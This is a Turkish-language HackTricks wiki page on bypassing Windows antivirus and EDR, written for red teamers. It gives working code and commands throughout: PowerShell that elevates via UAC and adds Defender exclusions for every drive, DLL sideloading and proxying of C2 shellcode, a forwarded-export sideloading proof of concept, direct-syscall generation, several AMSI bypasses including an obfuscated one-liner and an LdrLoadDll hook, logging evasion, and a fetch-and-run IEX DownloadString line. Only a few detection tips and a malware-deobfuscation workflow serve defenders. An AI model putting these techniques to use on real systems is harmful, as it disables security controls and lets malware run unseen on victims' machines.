# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p)**tarafından yazılmıştır!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ı çalışamaz hale getiren bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV taklidi yaparak Windows Defender'ı çalışamaz hale getiren bir araç.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender ile oynamadan önce installer-style UAC bait

Game cheats gibi davranan public loader'lar sık sık imzasız Node.js/Nexe installer'lar olarak gelir; bunlar önce **kullanıcıdan elevation ister** ve ancak ondan sonra Defender'ı etkisiz hale getirir. Akış basittir:

1. `net session` ile administrative context olup olmadığını kontrol et. Bu komut yalnızca çağıran admin rights sahibi olduğunda başarılı olur, bu yüzden bir failure loader'ın standard user olarak çalıştığını gösterir.
2. Beklenen UAC consent prompt'unu tetiklemek için kendini hemen `RunAs` verb'i ile yeniden başlat ve orijinal command line'ı koru.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Kurbanlar zaten “cracked” software kurduklarına inandıkları için, bu istem genellikle kabul edilir ve malware’e Defender’ın policy’sini değiştirmek için ihtiyaç duyduğu yetkileri verir.

### Her sürücü harfi için kapsamlı `MpPreference` exclusions

Yükseltildikten sonra, GachiLoader tarzı zincirler Defender’ı tamamen kapatmak yerine blind spot’larını en üst düzeye çıkarır. Loader önce GUI watchdog’u (`taskkill /F /IM SecHealthUI.exe`) öldürür ve ardından **son derece geniş exclusions** uygular, böylece her user profile, system directory ve removable disk taranamaz hale gelir:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ana gözlemler:

- Döngü bağlı olan her dosya sistemini gezer (D:\, E:\, USB bellekler vb.) bu yüzden **diskin herhangi bir yerine bırakılan gelecekteki herhangi bir payload göz ardı edilir**.
- `.sys` uzantı hariç tutması ileriye dönüktür—saldırganlar daha sonra Defender’a tekrar dokunmadan imzasız driver yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altına yazılır; böylece sonraki aşamalar dışlamaların kalıcı olduğunu doğrulayabilir veya UAC’yi yeniden tetiklemeden onları genişletebilir.

Hiçbir Defender servisi durdurulmadığı için, basit health check’ler gerçek zamanlı inceleme bu yolları hiç dokunmasa bile “antivirus active” raporlamaya devam eder.

## **AV Evasion Methodology**

Günümüzde AV’ler bir dosyanın zararlı olup olmadığını kontrol etmek için farklı yöntemler kullanır: static detection, dynamic analysis ve daha gelişmiş EDR’ler için behavioural analysis.

### **Static detection**

Static detection; bir binary veya script içinde bilinen kötü amaçlı string’leri ya da byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (örn. file description, company name, digital signatures, icon, checksum vb.) gerçekleştirilir. Bu, bilinen public tools kullanmanın sizi daha kolay ele verebileceği anlamına gelir; çünkü büyük ihtimalle analiz edilmiş ve malicious olarak işaretlenmişlerdir. Bu tür detection’dan kaçınmanın birkaç yolu vardır:

- **Encryption**

Binary’yi encrypt ederseniz, AV’nin programınızı tespit etmesinin bir yolu kalmaz; ancak programı memory içinde decrypt edip çalıştıracak bir loader’a ihtiyacınız olur.

- **Obfuscation**

Bazen AV’yi aşmak için tek yapmanız gereken binary veya script içindeki bazı string’leri değiştirmektir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu zaman alıcı olabilir.

- **Custom tooling**

Kendi araçlarınızı geliştirirseniz, bilinen kötü signature’lar olmaz; fakat bu çok fazla zaman ve emek ister.

> [!TIP]
> Windows Defender static detection’a karşı kontrol yapmak için iyi bir yöntem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)’tir. Temelde dosyayı birden fazla segmente böler ve ardından Defender’a her birini ayrı ayrı taratır; bu sayede binary’nizde tam olarak hangi string’lerin veya byte’ların işaretlendiğini söyleyebilir.

Pratik AV Evasion hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)’i incelemenizi şiddetle öneririm.

### **Dynamic analysis**

Dynamic analysis, AV’nin binary’nizi bir sandbox içinde çalıştırıp malicious activity aramasıdır (örn. browser passwords’unuzu decrypt edip okumaya çalışmak, LSASS üzerinde minidump almak vb.). Bu kısım biraz daha zor olabilir; ancak sandbox’ları atlatmak için yapabileceğiniz bazı şeyler vardır.

- **Sleep before execution** Nasıl implement edildiğine bağlı olarak, AV’nin dynamic analysis’ini bypass etmek için harika bir yol olabilir. AV’lerin kullanıcı iş akışını kesmemek için dosyaları taramak adına çok kısa bir süreleri vardır; bu yüzden uzun sleep süreleri binary’lerin analizini bozabilir. Sorun şu ki, birçok AV sandbox’ı uygulamaya bağlı olarak sleep’i atlayabilir.
- **Checking machine's resources** Genellikle sandbox’ların kullanabileceği çok az kaynak vardır (örn. < 2GB RAM); aksi halde kullanıcının makinesini yavaşlatabilirler. Burada da oldukça yaratıcı olabilirsiniz; örneğin CPU sıcaklığını veya fan hızlarını kontrol etmek gibi, çünkü her şey sandbox içinde uygulanmış olmayacaktır.
- **Machine-specific checks** Eğer workstation’ı "contoso.local" domain’ine join edilmiş bir kullanıcıyı hedefliyorsanız, bilgisayarın domain’ini kontrol edip belirlediğiniz değerle eşleşip eşleşmediğine bakabilirsiniz; eşleşmiyorsa programınızın çıkmasını sağlayabilirsiniz.

Meğer Microsoft Defender Sandbox bilgisayar adı HAL9TH imiş; yani detonasyon öncesi malware’inizde bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ile eşleşiyorsa bunun Defender sandbox içinde olduğunuz anlamına gelir; bu durumda programınızın çıkmasını sağlayabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit)’den Sandbox’lara karşı kullanabileceğiniz bazı başka çok iyi ipuçları

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Bu yazıda daha önce söylediğimiz gibi, **public tools** sonunda **detect edilecektir**, bu yüzden kendinize şu soruyu sormalısınız:

Örneğin LSASS dump etmek istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa LSASS dump eden, daha az bilinen başka bir proje kullanabilir misiniz?

Doğru cevap büyük olasılıkla ikincisidir. mimikatz’i örnek alırsak, muhtemelen AV’ler ve EDR’ler tarafından en çok işaretlenen malware parçalarından biridir; proje kendisi çok havalı olsa da, AV’leri aşmak için onunla çalışmak tam bir kabustur. Bu yüzden ulaşmak istediğiniz şey için alternatifler arayın.

> [!TIP]
> Evasion için payload’larınızı değiştirirken defender içinde **automatic sample submission** özelliğini kapattığınızdan emin olun ve lütfen, ciddi anlamda, uzun vadede evasion hedefliyorsanız **VIRUSTOTAL’A YÜKLEMEYİN**. Payload’ınızın belirli bir AV tarafından detect edilip edilmediğini kontrol etmek istiyorsanız, onu bir VM’ye kurun, automatic sample submission’ı kapatmaya çalışın ve sonuçtan memnun kalana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda her zaman **evasion için DLLs kullanmayı önceliklendirin**; benim deneyimime göre DLL dosyaları genellikle **çok daha az detect edilir** ve analiz edilir. Bu nedenle bazı durumlarda detection’dan kaçınmak için çok basit bir hiledir (tabii payload’ınızın DLL olarak çalıştırılmasının bir yolu varsa).

Bu görselde de görebileceğimiz gibi, Havoc’tan bir DLL Payload antiscan.me üzerinde 4/26 detection rate’e sahipken, EXE payload 7/26 detection rate’e sahiptir.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>normal bir Havoc EXE payload ile normal bir Havoc DLL’in antiscan.me karşılaştırması</p></figcaption></figure>

Şimdi daha stealthy olmak için DLL dosyalarıyla kullanabileceğiniz bazı hileleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, loader tarafından kullanılan DLL search order’dan faydalanır; victim application ile malicious payload(lar)ı yan yana konumlandırır.

[Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script’i kullanarak DLL Sideloading’e duyarlı programları kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e duyarlı programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktılar.

**DLL Hijackable/Sideloadable** programları kendiniz **explore** etmenizi şiddetle tavsiye ederim, bu teknik doğru yapıldığında oldukça stealthy’dir, ancak kamuya açık olarak bilinen DLL Sideloadable programları kullanırsanız, kolayca yakalanabilirsiniz.

Bir programın yüklemesini beklediği isimde kötü amaçlı bir DLL yerleştirmek, payload’unuzu yüklemez; çünkü program o DLL içinde bazı belirli fonksiyonları bekler. Bu sorunu düzeltmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.

**DLL Proxying**, bir programın proxy (ve kötü amaçlı) DLL üzerinden yaptığı çağrıları orijinal DLL’e yönlendirir; böylece programın işlevselliği korunur ve payload’unuzun çalıştırılmasını ele alabilirsiniz.

[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini [@flangvik](https://twitter.com/Flangvik/) kullanacağım.

İzlediğim adımlar şunlardı:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL source code şablonu ve orijinal yeniden adlandırılmış DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem bizim shellcode’umuz (SGN ile encode edilmiş: [SGN](https://github.com/EgeBalci/sgn)) hem de proxy DLL, [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate aldı! Buna başarı derim.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında daha fazla bilgi edinmek için [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) ve ayrıca burada daha derinlemesine tartıştıklarımızı öğrenmek için [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi **şiddetle tavsiye ederim**.

### Forwarded Exports'ları Kötüye Kullanmak (ForwardSideLoading)

Windows PE modülleri, aslında “forwarder” olan fonksiyonları export edebilir: code’a işaret etmek yerine, export girdisi `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir çağıran export’u resolve ettiğinde, Windows loader şunları yapar:

- Eğer yüklü değilse `TargetDll`’i yükler
- `TargetFunc`’u ondan resolve eder

Anlaşılması gereken temel davranışlar:
- Eğer `TargetDll` bir KnownDLL ise, protected KnownDLLs namespace’inden sağlanır (ör. ntdll, kernelbase, ole32).
- Eğer `TargetDll` bir KnownDLL değilse, normal DLL search order kullanılır; buna forward resolution yapan module’ün directory’si de dahildir.

Bu, dolaylı bir sideloading primitive’i sağlar: Bir function’ı KnownDLL olmayan bir module adına forwarded edilen signed DLL bulun, ardından o signed DLL’yi, forwarded target module ile tam olarak aynı adla adlandırılmış attacker-controlled bir DLL ile aynı dizine koyun. Forwarded export çağrıldığında, loader forward’u resolve eder ve DLL’nizi aynı dizinden yükler, böylece DllMain’iniz çalışır.

Windows 11’de gözlemlenen örnek:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değildir, bu yüzden normal arama sırası üzerinden çözülür.

PoC (copy-paste):
1) İmzalı sistem DLL’sini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Code execution elde etmek için minimal bir DllMain yeterlidir; DllMain’i tetiklemek için forwarded function’ı implement etmeniz gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İmzalı bir LOLBin ile forward’ı tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Gözlemlenen davranış:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) yükler
- `KeyIsoSetAuditingInterface` çözülürken, loader yönlendirmeyi `NCRYPTPROV.SetAuditingInterface`'e takip eder
- Loader ardından `NCRYPTPROV.dll` dosyasını `C:\test` içinden yükler ve onun `DllMain`'ini çalıştırır
- Eğer `SetAuditingInterface` implement edilmemişse, "missing API" hatasını ancak `DllMain` zaten çalıştıktan sonra alırsınız

Avlama ipuçları:
- Hedef module bir KnownDLL değilken forward edilmiş exports üzerine odaklanın. KnownDLLs, `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forward edilmiş exports'ları şu tür tooling ile enumerate edebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt

Detection/defense fikirleri:
- LOLBins’leri (örn. rundll32.exe) sistem dışı yollardan imzalı DLL’leri yüklerken, ardından aynı klasörden aynı temel ada sahip non-KnownDLLs’leri yüklerken izleyin
- Şu tür process/module zincirleri için alert oluşturun: `rundll32.exe` → sistem dışı `keyiso.dll` → kullanıcı tarafından yazılabilir yollardaki `NCRYPTPROV.dll`
- code integrity politikalarını (WDAC/AppLocker) zorlayın ve application dizinlerinde write+execute erişimini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze’i shellcode’unuzu gizli bir şekilde yüklemek ve execute etmek için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion sadece bir kedi & fare oyunudur; bugün çalışan bir şey yarın tespit edilebilir, bu yüzden asla tek bir araca güvenmeyin, mümkünse birden fazla evasion tekniğini zincirleme kullanmayı deneyin.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR'ler sık sık `ntdll.dll` syscall stub'ları üzerinde **user-mode inline hooks** yerleştirir. Bu hook'ları aşmak için, doğru **SSN** (System Service Number) yükleyen ve hooked export entrypoint'i çalıştırmadan kernel mode'a geçen **direct** veya **indirect** syscall stub'ları üretebilirsiniz.

**Invocation options:**
- **Direct (embedded)**: üretilen stub içine bir `syscall`/`sysenter`/`SVC #0` instruction yerleştirir (`ntdll` export'una uğramaz).
- **Indirect**: kernel transition'ın `ntdll`'den geliyormuş gibi görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için yararlıdır); **randomized indirect** her çağrı için bir havuzdan gadget seçer.
- **Egg-hunt**: diskte statik `0F 05` opcode dizisini gömmekten kaçınır; runtime'da bir syscall sequence çözer.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub byte'larını okumak yerine syscall stub'larını virtual address'e göre sıralayarak SSN'leri çıkarır.
- **SyscallsFromDisk**: temiz bir `\KnownDlls\ntdll.dll` map eder, `.text` içinden SSN'leri okur, sonra unmap eder (bellekteki tüm hook'ları aşar).
- **RecycledGate**: bir stub temiz olduğunda VA-sorted SSN çıkarımı ile opcode validation'ı birleştirir; hook'luysa VA çıkarımına geri döner.
- **HW Breakpoint**: `syscall` instruction üzerinde DR0 ayarlar ve hooked byte'ları parse etmeden runtime'da `EAX` içinden SSN'yi yakalamak için bir VEH kullanır.

Örnek SysWhispers4 kullanımı:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"i önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu, bu yüzden payload'ları somehow **doğrudan in-memory** çalıştırabilirseniz, AV bunu engellemek için hiçbir şey yapamazdı; çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control, veya UAC (EXE, COM, MSI veya ActiveX installation yükseltmesi)
- PowerShell (scripts, interactive use ve dynamic code evaluation)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA macros

Bu, script contents'i şifresiz ve obfuscated olmayan bir biçimde açığa çıkararak antivirus çözümlerinin script davranışını incelemesine olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` çalıştırmak, Windows Defender'da aşağıdaki alert'i üretir.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` ifadesini ve ardından script'in çalıştığı executable'ın path'ini nasıl öne eklediğine dikkat edin; bu durumda powershell.exe

Disk'e herhangi bir file bırakmadık, ama yine de AMSI nedeniyle in-memory yakalandık.

Ayrıca, **.NET 4.8** ile birlikte C# code de AMSI üzerinden çalıştırılır. Bu durum `Assembly.Load(byte[])` kullanımını da in-memory execution yüklemek için etkiler. Bu yüzden AMSI'den kaçınmak istiyorsanız in-memory execution için daha düşük .NET sürümlerinin (örneğin 4.7.2 veya altı) kullanılması önerilir.

AMSI'yi atlatmanın birkaç yolu vardır:

- **Obfuscation**

AMSI esas olarak static detections ile çalıştığından, yüklemeye çalıştığınız scripts'i değiştirmek detection'dan kaçınmak için iyi bir yol olabilir.

Ancak AMSI, birden fazla katman olsa bile scripts'in obfuscation'ını kaldırma yeteneğine sahiptir; bu yüzden bunun nasıl yapıldığına bağlı olarak obfuscation kötü bir seçenek olabilir. Bu da onu evasion açısından pek straightforward yapmaz. Yine de bazen tek yapmanız gereken birkaç variable name değiştirmektir ve yeterli olur; yani ne kadar flag'lendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe, vb.) process'ine bir DLL yüklenerek implement edildiği için, privileged olmayan bir user olarak çalışırken bile onu kolayca manipüle etmek mümkündür. AMSI implementasyonundaki bu flaw nedeniyle araştırmacılar AMSI scanning'den kaçmanın birden fazla yolunu bulmuştur.

**Forcing an Error**

AMSI initialization'ın fail olmasını zorlamak (amsiInitFailed), mevcut process için hiçbir scan başlatılmamasına neden olur. Bu durum ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmıştır ve Microsoft daha geniş kullanımını önlemek için bir signature geliştirmiştir.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Mevcut powershell işlemi için AMSI’yi kullanılamaz hale getirmek sadece tek bir satır powershell kodu gerektirdi. Bu satır elbette AMSI tarafından da işaretlendi, bu yüzden bu tekniği kullanmak için bazı değişiklikler gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) içinden aldığım değiştirilmiş bir AMSI bypass:
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi ve amsi.dll içindeki "AmsiScanBuffer" fonksiyonu için adresi bulmayı (kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu) ve bunu E_INVALIDARG için dönüş kodunu verecek talimatlarla üzerine yazmayı içerir; bu şekilde, gerçek taramanın sonucu 0 döner ve bu da temiz bir sonuç olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) okuyun.

Ayrıca powershell ile AMSI'yi bypass etmek için kullanılan başka birçok teknik de vardır, bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### amsi.dll yüklenmesini engelleyerek AMSI'yi bloklama (LdrLoadDll hook)

AMSI, yalnızca `amsi.dll` geçerli sürece yüklendikten sonra başlatılır. Güçlü ve dil bağımsız bir bypass yöntemi, `ntdll!LdrLoadDll` üzerine kullanıcı-modu bir hook yerleştirip istenen modül `amsi.dll` olduğunda bir hata döndürmektir. Sonuç olarak, AMSI hiç yüklenmez ve o süreç için hiçbir tarama gerçekleşmez.

Uygulama özeti (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript ve custom loaders dahil olmak üzere hepsiyle çalışır (aksi halde AMSI yükleyecek olan herhangi bir şey).
- Uzun command-line artefact’lerinden kaçınmak için stdin üzerinden script beslemeyle eşleştirin (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBins üzerinden çalışan loader’larda kullanıldığı görüldü (örn. `regsvr32` ile `DllRegisterServer` çağırma).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Tespit edilen signature’ı kaldırın**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi bir tool kullanarak mevcut process’in memory’sinden tespit edilen AMSI signature’ını kaldırabilirsiniz. Bu tool, current process’in memory’sini AMSI signature’ı için tarayıp ardından bunu NOP instructions ile üzerine yazarak çalışır ve böylece memory’den kaldırır.

**AMSI kullanan AV/EDR products**

**[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** içinde AMSI kullanan AV/EDR products listesini bulabilirsiniz.

**Powershell version 2 kullanın**
PowerShell version 2 kullanırsanız, AMSI load edilmez; böylece scriptlerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Bu, denetim ve sorun giderme amaçları için yararlı olabilir, ancak aynı zamanda **tespitten kaçmak isteyen saldırganlar için bir sorun** da olabilir.

PowerShell logging'i atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **Powershell version 2 kullanın**: PowerShell version 2 kullanırsanız, AMSI yüklenmez; böylece scriptlerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şöyle yapabilirsiniz: `powershell.exe -version 2`
- **Unmanaged Powershell Session kullanın**: Defenses olmadan bir powershell başlatmak için [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobal Strike içindeki `powerpick` bunu kullanır).


## Obfuscation

> [!TIP]
> Birkaç obfuscation tekniği veriyi encrypt etmeye dayanır; bu da binary'nin entropy'sini artırır ve AV'lerin ve EDR'lerin bunu tespit etmesini kolaylaştırır. Bununla dikkatli olun ve belki de encryption'ı yalnızca kodunuzun hassas olan ya da gizlenmesi gereken belirli bölümlerine uygulayın.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2 (veya commercial forks) kullanan malware analiz ederken, decompilers ve sandboxes'ı engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki workflow, sonradan dnSpy veya ILSpy gibi araçlarla C#'a decompile edilebilecek neredeyse-orijinal bir IL'i güvenilir şekilde **geri yükler**.

1.  Anti-tampering kaldırma – ConfuserEx her *method body*'yi encrypt eder ve bunu *module* static constructor (`<Module>.cctor`) içinde decrypt eder. Bu, PE checksum'ını da patch'ler; bu yüzden herhangi bir değişiklik binary'nin crash olmasına neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR key'lerini geri almak ve temiz bir assembly yeniden yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output, kendi unpacker'ınızı oluştururken yararlı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Symbol / control-flow recovery – *clean* dosyayı **de4dot-cex**'e verin (de4dot'un ConfuserEx-aware bir fork'u).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile'ını seçer
• de4dot, control-flow flattening'i geri alır, orijinal namespaces, classes ve variable names'i geri yükler ve constant strings'i decrypt eder.

3.  Proxy-call stripping – ConfuserEx, doğrudan method calls'ları decompilation'ı daha fazla bozmak için hafif wrapper'larla (diğer adıyla *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra `Class8.smethod_10`, … gibi opak wrapper functions yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'leri görmelisiniz.

4.  Manuel clean-up – ortaya çıkan binary'yi dnSpy altında çalıştırın, büyük Base64 blob'ları veya *real* payload'ı bulmak için `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Çoğu zaman malware bunu `<Module>.byte_0` içinde başlatılan TLV-encoded bir byte array olarak saklar.

Yukarıdaki zincir, malicious örneği çalıştırmaya gerek kalmadan execution flow'u geri yükler – offline bir workstation üzerinde çalışırken faydalıdır.

